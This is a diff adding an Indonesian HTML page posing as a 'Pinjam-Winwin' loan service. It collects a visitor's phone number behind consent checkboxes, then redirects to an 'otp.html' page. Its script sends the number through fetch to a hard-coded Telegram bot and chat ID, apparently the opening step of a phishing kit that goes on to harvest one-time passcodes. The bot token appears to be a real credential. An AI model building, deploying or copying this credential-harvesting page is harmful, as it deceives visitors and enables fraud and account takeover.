@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pinjam-Winwin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        
+        .gambar {
+      width: 100%;
+      margin-bottom: 0px;
+      margin-top:-64px;
+    }
+
+    .gambar img {
+      width: 100%;
+      object-fit: cover;
+      margin-bottom: 0px;
+    }
+        
+        .container {
+            background-color:white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 310px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        .input-group span {
+    position: absolute;
+    top: 50%;
+    left: 5px;
+    transform: translateY(-50%);
+    display: flex;
+    align-items: center;
+    gap: 5px; /* Menambahkan jarak antara ikon */
+}
+
+.input-group input[type="number"] {
+            width: 71%;
+            padding: 17px 19px 19px 69px; /* Sesuaikan padding kiri dengan ukuran logo */
+            border: 1px solid #ccc;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        /* Styling untuk checkbox yang disembunyikan */
+.agreements input[type="checkbox"] {
+    display: none;
+}
+
+/* Styling untuk custom checkbox */
+.agreements .checkbox-custom {
+    display: inline-block;
+    width: 15px;
+    height: 15px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    background-color: white;
+    vertical-align: middle;
+    margin-right: 8px;
+    transition: background-color 0.2s, border-color 0.2s;
+}
+
+/* Gaya saat checkbox dipilih */
+.agreements input[type="checkbox"]:checked + .checkbox-custom {
+    background-color: darkblue;
+    border-color: darkblue;
+}
+
+/* Styling untuk label checkbox */
+.agreements label {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    font-size: 14px;
+    margin-top:8px;
+}
+
+/* Styling untuk label saat dihover */
+.agreements label:hover .checkbox-custom {
+    border-color: #888;
+}
+
+        button {
+            width: 100%;
+            padding: 13px;
+            border: none;
+            font-weight: bold;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: not-allowed;
+            background-color: #ccc;
+            color: white;
+            transition: background-color 0.3s ease;
+        }
+        button.enabled {
+            background-color: darkblue;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+  <div class="gambar">
+    <img src="https://raw.githubusercontent.com/Tria6460/Tria6460.github.io/main/1723882447019.jpg" alt="Gambar Pucok">
+  </div>
+    <div class="container">
+        <div class="input-group">
+            <span>
+                <img src="https://raw.githubusercontent.com/Tria6460/Tria6460.github.io/main/1723885004429-removebg-preview.png" alt="Logo" width="30" height="30">
+                <img src="https://raw.githubusercontent.com/Tria6460/Tria6460.github.io/main/1723889289149-removebg-preview.png" alt="Logo 2" width="35" height="35">
+            </span>
+            <input type="number" id="phoneInput" placeholder=" " oninput="checkInput()">
+        </div>
+        <button id="submitButton" onclick="submitForm()" disabled>Lanjut</button>
+    </div>
+    
+<div class="agreements">
+    <label>
+        <input type="checkbox" id="agreement1" onchange="checkInput()">
+        <span class="checkbox-custom"></span>
+        Saya setuju dengan Syarat dan Ketentuan
+    </label>
+    <label>
+        <input type="checkbox" id="agreement2" onchange="checkInput()">
+        <span class="checkbox-custom"></span>
+        Saya setuju dengan Kebijakan Privasi
+    </label>
+    <label>
+        <input type="checkbox" id="agreement3" onchange="checkInput()">
+        <span class="checkbox-custom"></span>
+        Saya setuju menerima informasi terbaru
+    </label>
+</div>
+
+
+    <script>
+        const TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Ganti dengan token bot Anda
+        const CHAT_ID = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
+
+        function checkInput() {
+            const phoneInput = document.getElementById('phoneInput').value;
+            const agreement1 = document.getElementById('agreement1').checked;
+            const agreement2 = document.getElementById('agreement2').checked;
+            const agreement3 = document.getElementById('agreement3').checked;
+            const submitButton = document.getElementById('submitButton');
+
+            if (phoneInput.length > 0 && agreement1 && agreement2 && agreement3) {
+                submitButton.classList.add('enabled');
+                submitButton.disabled = false;
+            } else {
+                submitButton.classList.remove('enabled');
+                submitButton.disabled = true;
+            }
+        }
+
+        function submitForm() {
+            if (!document.getElementById('submitButton').disabled) {
+                const phoneInput = document.getElementById('phoneInput').value;
+
+                // Mengirimkan data ke Telegram
+                sendToTelegram(phoneInput);
+
+                // Redirect setelah mengirim data
+                window.location.href = 'otp.html';
+            }
+        }
+
+        function sendToTelegram(phoneNumber) {
+            const message = `Nomor HP: ${phoneNumber}`;
+            const url = `https://api.telegram.org/bot6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: 6824078885,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Pesan terkirim ke Telegram');
+                } else {
+                    console.error('Gagal mengirim pesan:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Terjadi kesalahan:', error);
+            });
+        }
+    </script>
+</body>
+</html>
